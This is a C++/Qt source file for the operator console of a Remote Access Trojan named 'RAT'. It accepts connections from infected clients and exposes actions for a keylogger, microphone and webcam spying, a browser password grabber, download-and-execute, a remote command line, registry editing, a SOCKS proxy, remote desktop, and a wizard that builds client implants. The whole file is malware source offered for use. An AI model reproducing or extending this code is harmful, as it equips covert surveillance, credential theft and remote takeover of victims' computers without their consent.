#include "../config.h"

#include "appsettings.h"
#include "mainwindow.h"
#include "settingsdialog.h"
#include "webserver.h"

#include "core/clientsmodel.h"

#include "dialogs/filetransferdialog.h"
#include "dialogs/taskmanagerdialog.h"
#include "dialogs/webcamviewdialog.h"
#include "dialogs/systeminfodialog.h"
#include "dialogs/vncdialog.h"
#include "dialogs/socksproxydialog.h"
#include "dialogs/remotedesktoppropertiesdialog.h"
#include "dialogs/commandlineinterfacedialog.h"
#include "dialogs/filemanagerdialog.h"
#include "dialogs/messageboxdialog.h"
#include "dialogs/screenshotdialog.h"
#include "dialogs/startupmanagerdialog.h"
#include "dialogs/visitwebsitedialog.h"
#include "dialogs/keyloggerdialog.h"
#include "dialogs/browseropentabsdialog.h"
#include "dialogs/createclientdialog.h"
#include "dialogs/registrydialog.h"
#include "dialogs/micspydialog.h"
#include "dialogs/browserpasswords.h"
#include "dialogs/downloadandexecdialog.h"

#include "clientbuildwizard.h"

#include "../common/abstractclient.h"
#include "../common/consts.h"
#include "../common/features.h"
#if (RAT_SERVER_LOGGER == 1)
#   include "showlogdialog.h"
#endif


#include <Server>
#include <SimpleTokenValidator>
#include <QtCore/QDebug>
#include <QtNetwork/QHostAddress>
#include <QtWidgets/QMessageBox>
#include <QtCore/QMetaMethod>
#include <QtWidgets/QSystemTrayIcon>
#include <QtCore/QTranslator>
#include <QtCore/QLibraryInfo>
#include <QtWidgets/QLabel>


#define CHECK_CLIENT_ARG(a) \
    auto a = client(); \
    if (!a) { \
        qDebug() << "Client not exists"; \
        return; \
    }

#define CHECK_CLIENT CHECK_CLIENT_ARG(peer)

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , translator(nullptr)
{
    setupUi(this);

//    setWindowTitle(qApp->applicationName() + " - v" + qApp->applicationVersion());
    qRegisterMetaType<AbstractClient *>();
    qRegisterMetaType<Neuron::AbstractCall *>();

    initServer();
    initModel();
    initTray();
    initActions();
    initWebServer();
    initStatusBar();

    bool start = _server->startServer(RatAppSettings->ratPort());

    if (start)
        connectionLabel->setText("Running");
    else
        connectionLabel->setText("Error");

    if (RatAppSettings->enableBroadcasting()) {
        _server->startBroadcast(RatAppSettings->ratPort(), RatAppSettings->broadcastPort());
    }
#if (RAT_SERVER_LOGGER == 1)
    Logger::instance()->init();
    qDebug() << "Init log system";
#else
    actionLogs->setVisible(false);
#endif

    on_actionList_view_triggered();
}

MainWindow::~MainWindow()
{
    if (_tray)
        _tray->hide();
}

void MainWindow::installTranslator(const QString &lang)
{
    if (translator)
        qApp->removeTranslator(translator);
    else
        translator = new QTranslator;

    if (qtTranslator)
        qApp->removeTranslator(qtTranslator);
    else
        qtTranslator = new QTranslator;

    if (lang == "fa")
        QLocale::setDefault(QLocale(QLocale::Persian, QLocale::Iran));
    else
        QLocale::setDefault(QLocale(QLocale::English, QLocale::UnitedStates));
    translator->load("rat_" + lang, "/doc/dev/Qt/rat/server/translations/");
    auto ok = qApp->installTranslator(translator);
    if (!ok)
        qDebug() << "Unable to install translator";

    qtTranslator->load("qt_fa",
                      QLibraryInfo::location(QLibraryInfo::TranslationsPath));
    ok = qApp->installTranslator(qtTranslator);
    if (!ok)
        qDebug() << "Unable to install Qt translator";

//    qApp->setLayoutDirection(translator->translate("App", "RTL", "0 or 1").toInt()
//                                 ? Qt::RightToLeft
//                                 : Qt::LeftToRight);

    qApp->setApplicationDisplayName(translator->translate("App", "RAT"));
    qApp->setApplicationVersion(translator->translate("App", "0.1 preview"));
}

void MainWindow::changeEvent(QEvent *e)
{
    QMainWindow::changeEvent(e);
    switch (e->type()) {
    case QEvent::LanguageChange:
        retranslateUi(this);
//        _model->setHeaderText("os", tr("OS"));
//        _model->setHeaderText("platform", tr("Platform"));
//        _model->setHeaderText("version", tr("App version"));
//        _model->setHeaderText("address", tr("Address"));
        break;
    default:
        break;
    }
}

void MainWindow::enableActions(const QStringList &features)
{
    //TODO: new feature
    actionFileManager->setEnabled(features.contains(Features::FileManager));
    actionFileTransfer->setEnabled(features.contains(Features::FileTransfer));
    actionMessageBox->setEnabled(features.contains(Features::MessageBox));
    actionOpenUrl->setEnabled(features.contains(Features::OpenUrl));
    actionScreenShot->setEnabled(features.contains(Features::Screenshot));
    actionStartupManager->setEnabled(features.contains(Features::StartupManager));
    actionTaskManager->setEnabled(features.contains(Features::TaskManager));
    actionWebcam->setEnabled(features.contains(Features::Webcam));
    actionSystem_informations ->setEnabled(features.contains(Features::SystemInformations));
    actionRemote_desktop->setEnabled(features.contains(Features::RemoteDesktop));
    actionSocks_proxy->setEnabled(features.contains(Features::SocksProxy));
    actionLock->setEnabled(features.contains(Features::LockScreen));
    actionUnlock->setEnabled(features.contains(Features::LockScreen));
    actionKeylogger->setEnabled(features.contains(Features::KeyLogger));
    actionBrowser_tabs->setEnabled(features.contains(Features::BrowserTabs));
    menuPower->setEnabled(features.contains(Features::Power));
    actionCli->setEnabled(features.contains(Features::CommandLine));
    actionRegistry->setEnabled(features.contains(Features::Registry));
    actionDownload_execute->setEnabled(features.contains(Features::DownloadAndExec));
    actionPassword_grabber->setEnabled(features.contains(Features::PassworgGraber));
}

void MainWindow::on_tableView_activated(const QModelIndex &index)
{
    Q_UNUSED(index)
}

void MainWindow::on_actionTaskManager_triggered()
{
    CHECK_CLIENT
    TaskManagerDialog d(peer, this);
    d.exec();
}

void MainWindow::on_actionMessageBox_triggered()
{
    CHECK_CLIENT
    MessageBoxDialog d(peer, this);
    d.exec();
}

void MainWindow::on_actionStartupManager_triggered()
{
    CHECK_CLIENT
    StartupManagerDialog d(peer, this);
    d.exec();
}

void MainWindow::on_actionCli_triggered()
{
    CHECK_CLIENT
    CommandLineInterfaceDialog d(peer, this);
    d.exec();
}

void MainWindow::on_actionScreenShot_triggered()
{
    CHECK_CLIENT
    ScreenShotDialog d(peer, this);
    d.exec();
}

void MainWindow::on_actionFileManager_triggered()
{
    CHECK_CLIENT
    FileManagerDialog d(peer, this);
    d.exec();
}

void MainWindow::on_actionOpenUrl_triggered()
{
    CHECK_CLIENT
    VisitWebsiteDialog d(peer, this);
    d.exec();
}

void MainWindow::on_actionWebcam_triggered()
{
    CHECK_CLIENT
    WebcamViewDialog d(peer, this);
    d.exec();
}

void MainWindow::on_actionFileTransfer_triggered()
{
    CHECK_CLIENT
    FileTransferDialog d(peer, this);
    d.setType(TransferType::Push);
    d.setEnableLocalSelection(true);
    d.setEnableRemoteSelection(true);
    d.exec();
}

void MainWindow::initTray()
{
    _tray = new QSystemTrayIcon(this);

    _tray->setToolTip(qApp->applicationDisplayName());
    _tray->setIcon(windowIcon());
    _tray->setVisible(true);

    auto trayMenu = new QMenu(this);

    auto actionOpen = trayMenu->addAction(tr("Open"));
    trayMenu->addSeparator();
    auto actionExit = trayMenu->addAction("Exit");

    connect(actionOpen, &QAction::triggered, this, &QMainWindow::show);
    connect(actionExit, &QAction::triggered, this, &QMainWindow::close);

    _tray->setContextMenu(trayMenu);
}

void MainWindow::on_actionClose_triggered()
{
    hide();
}

void MainWindow::on_actionAbout_triggered()
{
    QString aboutText = QString("<h1>%1</h1>"
                                "<p>%2</p>"
                                "<p>%4: %3</p>")
                            .arg(qApp->applicationDisplayName(),
                                 qApp->applicationName(),
                                 qApp->applicationVersion(),
                                 tr("Version"));
    QMessageBox::information(this, actionAbout->text(), aboutText);
}

void MainWindow::on_actionEnglish_triggered()
{
    installTranslator("en");
    retranslateUi(this);
}

void MainWindow::on_actionFarsi_triggered()
{
    installTranslator("fa");
    retranslateUi(this);
}

void MainWindow::initServer()
{
    _server = new Neuron::Server(this);
    _server->setServerType(Neuron::Server::SingleThread);
    _server->setEncoder(new Neuron::SimpleTokenValidator(TOKEN));
    _server->registerType<AbstractClient *>();
    _server->setReconnectTimeout(10);
}

void MainWindow::initModel()
{
    _model = new ClientsModel(_server);

    listView->setModel(_model);
    tableView->setModel(_model);

    tableView->setColumnWidth(0, 120);
    tableView->setColumnWidth(1, 100);
    tableView->setColumnWidth(2, 100);
    connect(_model, &ClientsModel::peerDisconnected, [this](){
        auto index = tableView->currentIndex();
        auto peer = _model->client(index);

        if (peer)
            enableActions(_model->features(index));
        else
            enableActions(QStringList());
    });

//    connect(_model, &ClientsModel::dis::peerAdded, [this](Neuron::Peer *p) {
//        qDebug() << Q_FUNC_INFO;
//        auto cl = qobject_cast<AbstractClient *>(p);
//        if (p) {
//            connect(cl, &AbstractClient::osChanged, [this, p](QString os) {
//                qDebug() << "os changed:" << os;
//                _model->invalidateProperty(p, "os");
//            });
//            connect(cl, &AbstractClient::versionChanged, [this, p](QString) {
//                _model->invalidateProperty(p, "version");
//            });
//            connect(cl, &AbstractClient::platformChanged, [this, p](int) {
//                _model->invalidateProperty(p, "platform");
//            });
//        }
//    });
//    qRegisterMetaType<AbstractClient::Platform>();
//    auto ep = QMetaEnum::fromType<AbstractClient::Platform>();
//    _model->installTranslator("platform",
//                              [ep](QVariant p) { return QString(ep.valueToKey(p.toInt())); });

}

void MainWindow::initWebServer()
{
    if (AppSettings::supportsInstaller()) {
        webServer = new WebServer();
        webServer->start(RatAppSettings->installerPort());
    }
}

void MainWindow::initStatusBar()
{
    connectionLabel = new QLabel(this);
    statusBar()->addPermanentWidget(connectionLabel);

    auto slider = new QSlider(this);
    slider->setMinimum(32);
    slider->setMaximum(512);
    slider->setMinimumWidth(60);
    slider->setOrientation(Qt::Horizontal);
//    slider->setSizePolicy(QSizePolicy(QSizePolicy::Minimum, QSizePolicy::Minimum));
    connect(slider, &QSlider::valueChanged, [this](int value){
        _model->setThumbnailSize(value);
        listView->setIconSize(QSize(value, value));
    });
    statusbar->addPermanentWidget(slider);
}

AbstractClient *MainWindow::client() const
{
    QModelIndex i;
    if (stackedWidget->currentIndex() == 0) {
        if (!tableView->currentIndex().isValid())
            return nullptr;
        i = tableView->currentIndex();
    } else {
        if (!tableView->currentIndex().isValid())
            return nullptr;
        i = listView->currentIndex();
    }
    auto peer = _model->client(tableView->currentIndex());
    return peer;
}

void MainWindow::closeEvent(QCloseEvent *event)
{
    Q_UNUSED(event)
}

void MainWindow::initActions()
{
    enableActions();
}

void MainWindow::on_actionSystem_informations_triggered()
{
    CHECK_CLIENT
    SystemInfoDialog d(peer, this);
    d.exec();
}

void MainWindow::on_actionRemote_desktop_triggered()
{
    CHECK_CLIENT
    RemoteDesktopPropertiesDialog p(this);
    if (p.exec() != QDialog::Accepted)
        return;

    if (!peer) {
        QMessageBox::information(this, tr("Remote desktop"), tr("Client has disconnected"));
        return;
    }
    auto d = new VNCDialog(peer, p.resulation(), p.port(), p.format(), this);
    d->setAttribute(Qt::WA_DeleteOnClose);
    d->show();
}

void MainWindow::on_tableView_clicked(const QModelIndex &index)
{
    auto peer = _model->client(index);

    if (peer)
        enableActions(_model->features(index));
    else
        enableActions(QStringList());
}

void MainWindow::on_actionSocks_proxy_triggered()
{
    CHECK_CLIENT
    SocksProxyDialog d(peer, this);
    d.exec();
}

void MainWindow::on_tableView_customContextMenuRequested(const QPoint &pos)
{
    on_tableView_clicked(tableView->indexAt(pos));
    CHECK_CLIENT
    menuTools->popup(tableView->mapToGlobal(pos));
}

void MainWindow::on_actionShutdown_triggered()
{
    CHECK_CLIENT
    peer->shutdown();
}

void MainWindow::on_actionReboot_triggered()
{
    CHECK_CLIENT
    peer->reboot();
}

void MainWindow::on_actionLock_triggered()
{
    CHECK_CLIENT
    peer->lockDesktop();
}

void MainWindow::on_actionUnlock_triggered()
{
    CHECK_CLIENT
    peer->unlockDesktop();
}

void MainWindow::on_actionKeylogger_triggered()
{
    CHECK_CLIENT
    KeyloggerDialog d(peer, this);
    d.exec();
}

void MainWindow::on_actionLogOut_triggered()
{
    CHECK_CLIENT
    peer->logoutSlot();
}

void MainWindow::on_actionBrowser_tabs_triggered()
{
    CHECK_CLIENT
    BrowserOpenTabsDialog d(peer, this);
    d.exec();
}

void MainWindow::on_actionMake_client_triggered()
{
    ClientBuildWizard d(this);
//    CreateClientDialog d(this);
    d.exec();
}

void MainWindow::on_actionSettings_triggered()
{
    SettingsDialog d(this);
    d.exec();
}

void MainWindow::on_actionRegistry_triggered()
{
    CHECK_CLIENT
    RegistryDialog d(peer, this);
    d.exec();
}

void MainWindow::on_actionLogs_triggered()
{
#if (RAT_SERVER_LOGGER == 1)
    ShowLogDialog d;
    d.exec();
#endif
}

void MainWindow::on_actionMinrophone_spy_triggered()
{
    CHECK_CLIENT
    MicSpyDialog d(peer, this);
    d.exec();
}

void MainWindow::on_actionIcon_view_triggered()
{
    _model->setShowThumbnail(true);
    stackedWidget->setCurrentIndex(1);
    actionList_view->setChecked(false);
    actionIcon_view->setChecked(true);
}

void MainWindow::on_actionList_view_triggered()
{
    _model->setShowThumbnail(false);
    stackedWidget->setCurrentIndex(0);
    actionList_view->setChecked(true);
    actionIcon_view->setChecked(false);
}

void MainWindow::on_listView_customContextMenuRequested(const QPoint &pos)
{
    on_tableView_clicked(tableView->indexAt(pos));
    CHECK_CLIENT
    menuTools->popup(listView->mapToGlobal(pos));
}

void MainWindow::on_listView_clicked(const QModelIndex &index)
{
    auto peer = _model->client(index);

    if (peer)
        enableActions(_model->features(index));
    else
        enableActions(QStringList());
}

void MainWindow::on_actionPassword_grabber_triggered()
{
    CHECK_CLIENT
    BrowserPasswords d(peer, this);
    d.exec();
}

void MainWindow::on_actionDownload_execute_triggered()
{
    CHECK_CLIENT
    DownloadAndExecDialog d(peer, this);
    d.exec();
}
